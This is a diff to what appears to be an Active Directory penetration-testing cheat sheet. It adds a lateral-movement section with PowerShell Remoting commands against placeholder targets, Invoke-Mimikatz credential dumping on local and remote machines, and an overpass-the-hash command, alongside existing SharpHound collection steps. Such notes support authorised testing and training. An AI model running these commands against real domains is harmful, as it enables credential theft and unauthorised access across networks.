@@ -178,7 +178,7 @@ Several tools:
 
 [Documentation](https://bloodhound.readthedocs.io/en/latest/index.html)
 
-Using SharpHound to collect data
+### Using SharpHound to collect data
 
 ```powershell
 . .\C:\AD\BloodHound-master\Ingestors\SharpHound.ps1
@@ -186,7 +186,7 @@ Invoke-BloodHound -CollectionMethod All -Verbose # collects all data from the do
 Invoke-BloodHound -CollectionMethod LoggedOn -Verbose # for the sessions
 ```
 
-Installation of Neo4j
+### Installation of Neo4j
 
 ```powershell
 cd C:\AD\neo4j-community-4.1.1\bin>
@@ -199,7 +199,57 @@ Once this is done, close the browser, go to the `BloodHound-win32-x64` folder an
 
 Finally, click on `Upload Data` and select the .zip file that contains the domain data.
 
-## [↑](#table-of-contents) Lateral Movement
+## [](#table-of-contents) Lateral Movement
+
+### Powershell Remoting
+
+Access with PS Remoting to a remote machine (WINRM|5985/tcp)
+
+```powershell
+Enter-PSSession -ComputerName {TARGET}
+
+# with stateful
+$sess = New-PSSession -ComputerName {TARGET}
+Enter-PSSession -Session $sess
+```
+
+Running commands on remote machine
+
+```powershell
+Invoke-Command -ComputerName {TARGET} -ScriptBlock {whoami;hostname}
+```
+
+Loading a script on a remote machine
+
+```powershell
+Invoke-Command -ComputerName {TARGET} -FilePath '{FILEPATH}'
+
+# or
+
+$sess = New-PSSession -ComputerName {TARGET}
+Invoke-Command -FilePath {FILEPATH}
+Enter-PSSession -Session $sess
+```
+
+### Invoke-Mimikatz
+
+Dump credentials on a local machine
+
+```powershell
+Invoke-Mimikatz -DumpCreds
+```
+
+Dump credentials from multiple remote machines
+
+```powershell
+Invoke-Mimikatz -DumpCreds -ComputerName@("sys1","sys2")
+```
+
+[Over pass the hash](https://blog.gentilkiwi.com/securite/mimikatz/overpass-the-hash) - generate tokens from hashes.
+
+```powershell
+Invoke-Mimikatz -Command '"sekurlsa::pth /user:{USER} /domain:{DOMAIN} /ntlm:{NTLM_HASH} /run:powershell.exe"'
+```
 
 ## [↑](#table-of-contents) Domain PrivEsc
 
